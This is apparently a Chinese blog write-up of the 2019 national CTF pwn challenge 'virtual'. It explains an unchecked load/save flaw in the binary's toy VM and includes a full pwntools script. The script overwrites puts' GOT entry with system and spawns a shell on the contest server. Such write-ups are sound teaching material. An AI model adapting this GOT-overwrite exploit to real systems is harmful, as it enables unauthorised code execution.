---
title: 2019国赛 virtual writeup
date: 2019-04-22 09:26:02
tags: [pwn, ctf, "2019 国赛", writeup]
---
周末(日)打了国赛，本来周六没打就想划了，后来还是打了一下。主要做了一下virtual这题，还挺有意思的。
<!-- more -->
## 题目分析
首先拿到binary，先拖进ida，发现是一个类似虚拟机的东西，实现了几个指令，分别是
* `push`
* `pop`
* `add`
* `sub`
* `mul`
* `div`
* `load`
* `save`
通过分析逻辑发现，程序维护了三个栈，三个栈的结构如图所示：
![](/img/img_byctf2019_0.jpg)
其中，三个栈分别为：指令栈，数据栈，运行时栈。有问题的是`load`,`save`指令。
load:
![](/img/img_byctf2019_1.png)

save:

![](/img/img_byctf2019_2.png)

这两个指令没有对写入和载入的地址做判断，因此可以任意地址读写。

## 解题思路
这题主要有两个难点，一个是没有leak。整个程序只有一次输出，因此无法通过leak来知道堆地址、栈地址、libc基址等(虽然也不需要)。所以这里我们采用类似ROP中`adc gadget`的方法来进行利用。由于没有告诉我们libc版本，因此可以先采用程序的输出来leak libc版本，之后就好办了。还有一个难点就是函数逻辑比较绕，最后`save`操作先取地址再取值，因此需要和数据栈再配合一下。最终的payload如下：

* Instructions: `push push push push push push push load div add pop load div add load add push save`
* Data: `offset(system-puts) 0x404020/8 -8 -6 0x404020/8+1 -8 -9`
* name: `/bin/sh`

这里稍微解释一下流程，前面几个`push`不用解释，就是把数据栈中的数据压入运行栈。由于`save`函数的流程是先取地址的，因此我们先计算地址。第一个`load`是load了当前栈中的数据在堆上的地址，然后通过`add`抵消了寻址时的地址，这边就计算出了`save`时需要的地址的值，然后`pop`出来，继续计算。第二个`load`同理先load自己，然后通过计算就能load`got`表中`0x404020`这个位置存放的值了，这就是`puts`的实际地址。然后通过`add`指令将偏移加到结果上，这样得到了目标值，接下来只要通过`save`指令将结果写到got表就好了。

## 脚本

```python
#! /usr/bin/env python2
# Author: 850@[AAA,s^2,BIXOH]
from pwn import *
import os
"""
pwn script framework
"""

class BASE(object):
    def __init__(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc, _log_level):
        """
        initial basic paramaters
        """
        self.rhost = remote_host
        self.rport = remote_port
        self.elf_name = local_elf
        self.gdb_scripts = gdb_script
        self.local_libc = _local_libc
        self.remote_libc = _remote_libc
        context(os='linux', log_level=_log_level)
        context(terminal=["xfce4-terminal", "-e"])

    def local_debug(self, gdb_attach):
        """
        debug with GDB
        """
        self.target = process(self.elf_name)
        self.one_gadget_addr = 0x45254
        self.elf = ELF(self.elf_name)
        self.libc = ELF(self.local_libc)
        if gdb_attach:
            gdb.attach(self.target, gdbscript=self.gdb_scripts)

    def remote_attack(self,):
        """
        remote exploit
        """
        self.libc = ELF(self.remote_libc)
        self.one_gadget_addr = 0xf02a4
        self.target = remote(self.rhost, self.rport)
        self.elf = ELF(self.elf_name)
        
    def run(self,):
        # self.local_debug(gdb_attach=False)
        self.remote_attack()
        # offset = self.one_gadget_addr - self.libc.symbols['puts'] 
        offset = self.libc.symbols['system'] - self.libc.symbols['puts'] 
        instructions = ["push "*7,"load", "div", "add" ,"pop","load","div","add","load","add","push","save"]
        data = [offset,0x404020/8, -8, -6, 0x404020/8+1, -8, -9]
        tmp=[]
        for i in data:
            tmp.append(str(i))
        print tmp
        self.target.sendlineafter("Your program name:", "/bin/sh")
        self.target.sendlineafter("Your instruction:", " ".join(instructions))
        self.target.sendlineafter("Your stack data:", " ".join(tmp))

        # self.target.recvuntil("Fuck")
        # self.target.recvline()
        # free_addr = int(self.target.recvline())

        # print "free_addr: "+hex(free_addr)
        self.target.interactive()
        return "done"

solve = BASE(
    remote_host="a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com",
    remote_port= 40003,
    local_elf="./virtual",
    _remote_libc="./libc6.so",
    _local_libc="/lib64/libc.so.6",
    gdb_script="b *0x401d37\nb *0x401d98\nb * 0x401cce",
    _log_level="debug"
)
print solve.run() 
```
